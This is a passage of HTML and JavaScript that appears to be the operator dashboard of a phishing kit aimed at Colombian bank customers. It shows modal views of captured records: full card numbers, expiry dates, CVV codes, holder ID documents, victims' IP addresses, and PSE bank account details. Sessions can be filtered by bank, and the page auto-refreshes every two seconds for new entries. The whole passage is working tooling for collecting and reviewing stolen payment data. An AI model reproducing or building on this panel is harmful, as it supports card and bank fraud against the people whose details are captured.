                            <div class="modal-field-value">${datos.titular}</div>
                        </div>
                        <div class="modal-field">
                            <div class="modal-field-label">Documento</div>
                            <div class="modal-field-value">${datos.documento}</div>
                        </div>
                    </div>
                    <div style="display:grid; grid-template-columns:1fr 1fr; gap:15px; margin-bottom:15px;">
                        <div class="modal-field">
                            <div class="modal-field-label">Tipo de Tarjeta</div>
                            <div class="modal-field-value">${datos.tipo_tarjeta === 'credito' ? 'Crédito' : 'Débito'}</div>
                        </div>
                        <div class="modal-field">
                            <div class="modal-field-label">Cuotas</div>
                            <div class="modal-field-value">${datos.cuotas || 'N/A'}</div>
                        </div>
                    </div>
                    <div style="display:grid; grid-template-columns:1fr; gap:15px; margin-bottom:15px;">
                        <div class="modal-field">
                            <div class="modal-field-label">Número de Tarjeta</div>
                            <div class="modal-field-value" style="color:#1a56db; font-family:monospace; letter-spacing:2px;">${datos.numero_tarjeta}</div>
                        </div>
                    </div>
                    <div style="display:grid; grid-template-columns:1fr 1fr; gap:15px; margin-bottom:15px;">
                        <div class="modal-field">
                            <div class="modal-field-label">Vencimiento</div>
                            <div class="modal-field-value">${datos.vencimiento}</div>
                        </div>
                        <div class="modal-field">
                            <div class="modal-field-label">CVV</div>
                            <div class="modal-field-value" style="color:#1a56db; font-family:monospace; letter-spacing:2px;">${datos.cvc}</div>
                        </div>
                    </div>
                    <div style="display:grid; grid-template-columns:1fr 1fr; gap:15px; margin-bottom:15px;">
                        <div class="modal-field">
                            <div class="modal-field-label">Fecha Registro</div>
                            <div class="modal-field-value">${datos.fecha}</div>
                        </div>
                        <div class="modal-field">
                            <div class="modal-field-label">IP</div>
                            <div class="modal-field-value">${datos.ip}</div>
                        </div>
                    </div>
                `;
            } else {
                modalTitulo.textContent = '🏦 Detalles de PSE';
                html = `
                    <div style="display:grid; grid-template-columns:1fr 1fr; gap:15px; margin-bottom:15px;">
                        <div class="modal-field">
                            <div class="modal-field-label">Plan</div>
                            <div class="modal-field-value">${datos.plan_nombre}</div>
                        </div>
                        <div class="modal-field">
                            <div class="modal-field-label">Monto</div>
                            <div class="modal-field-value" style="color:#1a56db;">$ ${new Intl.NumberFormat('es-CO').format(datos.plan_precio || 0)}</div>
                        </div>
                    </div>
                    <div style="display:grid; grid-template-columns:1fr 1fr; gap:15px; margin-bottom:15px;">
                        <div class="modal-field">
                            <div class="modal-field-label">Titular</div>
                            <div class="modal-field-value">${datos.titular_pse}</div>
                        </div>
                        <div class="modal-field">
                            <div class="modal-field-label">Documento</div>
                            <div class="modal-field-value">${datos.documento_pse}</div>
                        </div>
                    </div>
                    <div style="display:grid; grid-template-columns:1fr 1fr; gap:15px; margin-bottom:15px;">
                        <div class="modal-field">
                            <div class="modal-field-label">Tipo Documento</div>
                            <div class="modal-field-value">${datos.tipo_documento}</div>
                        </div>
                        <div class="modal-field">
                            <div class="modal-field-label">Tipo Cuenta</div>
                            <div class="modal-field-value">${datos.tipo_cuenta}</div>
                        </div>
                    </div>
                    <div style="display:grid; grid-template-columns:1fr 1fr; gap:15px; margin-bottom:15px;">
                        <div class="modal-field">
                            <div class="modal-field-label">Banco</div>
                            <div class="modal-field-value">${datos.banco_pse}</div>
                        </div>
                        <div class="modal-field">
                            <div class="modal-field-label">Número Cuenta</div>
                            <div class="modal-field-value">${datos.numero_cuenta}</div>
                        </div>
                    </div>
                    <div style="display:grid; grid-template-columns:1fr 1fr; gap:15px; margin-bottom:15px;">
                        <div class="modal-field">
                            <div class="modal-field-label">Fecha Registro</div>
                            <div class="modal-field-value">${datos.fecha}</div>
                        </div>
                        <div class="modal-field">
                            <div class="modal-field-label">IP</div>
                            <div class="modal-field-value">${datos.ip}</div>
                        </div>
                    </div>
                `;
            }
            
            modalBody.innerHTML = html;
            modal.style.display = 'flex';
        }

        function cerrarModal() {
            document.getElementById('modalDetalles').style.display = 'none';
        }

        // ======================== FILTROS ========================
        let bancoActivo = 'todos';

        function filtrarPorBanco(banco) {
            bancoActivo = banco;
            document.querySelectorAll('.filtro-btn').forEach(b => b.classList.remove('active'));
            document.querySelector(`.filtro-btn[data-banco="${banco}"]`)?.classList.add('active');
            aplicarFiltros();
        }

        function aplicarFiltros() {
            const texto = document.getElementById('filtroInput').value.toLowerCase();
            const cards = document.querySelectorAll('.sesion-card');

            cards.forEach(card => {
                const banco = card.dataset.banco || '';
                const usuario = card.dataset.usuario || '';
                const id = card.dataset.id || '';
                const coincideBanco = bancoActivo === 'todos' || banco === bancoActivo;
                const coincideTexto = !texto || usuario.includes(texto) || id.includes(texto) || banco.includes(texto);
                card.style.display = (coincideBanco && coincideTexto) ? '' : 'none';
            });
        }

        // ======================== CARGA DE DATOS ========================
        function cargarDatos() {
            fetch(window.location.href + '?ajax=1')
                .then(res => res.text())
                .then(html => {
                    const parser = new DOMParser();
                    const doc = parser.parseFromString(html, 'text/html');
                    
                    const newList = doc.querySelector('#sesionesList');
                    if (newList) {
                        document.getElementById('sesionesList').innerHTML = newList.innerHTML;
                    }
                    
                    const newTotal = doc.querySelector('#statTotal');
                    const newPendientes = doc.querySelector('#statPendientes');
                    if (newTotal) document.getElementById('statTotal').textContent = newTotal.textContent;
                    if (newPendientes) document.getElementById('statPendientes').textContent = newPendientes.textContent;
                    
                    aplicarFiltros();
                })
                .catch(err => console.log('Error:', err));
        }

        // ======================== AUTO-REFRESH ========================
        let autoRefreshInterval;

        function iniciarAutoRefresh() {
            autoRefreshInterval = setInterval(cargarDatos, 2000);
        }

        document.addEventListener('DOMContentLoaded', function() {
            iniciarAutoRefresh();
            aplicarFiltros();
        });
    </script>
</body>
</html>
